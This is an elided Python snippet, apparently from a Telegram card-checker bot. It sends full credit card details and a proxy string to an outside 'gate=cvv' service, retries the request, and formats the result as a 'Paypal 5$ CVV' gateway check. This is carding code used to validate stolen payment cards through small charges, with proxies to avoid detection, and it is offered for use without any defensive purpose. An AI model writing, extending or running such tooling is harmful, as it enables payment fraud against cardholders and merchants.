...
API_BASE_URL = "https://cvv.nikhilkhokhar.com"
...
async def check_card_pv(card_details: str, user_info: dict) -> Optional[str]:
    ...
    api_url = f"{API_BASE_URL}/gate=cvv/cc={card_string}"
    
    # Encode the proxy string for URL safety (optional but good practice)
    from urllib.parse import quote
    safe_proxy_string = quote(PROXY_STRING, safe='')
    
    # Append proxy to URL if supported by the gateway logic
    # Note: We append it as a query parameter as per the previous logic style
    final_url = f"{api_url}?proxy={safe_proxy_string}"
    ...
    for attempt in range(max_retries):
        try:
            ...
            async with aiohttp.ClientSession() as session:
                ...
                async with session.get(final_url, timeout=aiohttp.ClientTimeout(total=50)) as response:
...
def format_response_pv(api_response: dict, user_info: dict, card_details: str, 
    ...
    response_text = api_response.get("response", "UNKNOWN_ERROR")
...
{card_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 5$ CVV</i>
...
if __name__ == "__main__":
    ...
    asyncio.run(check_card_pv(test_card, test_user))
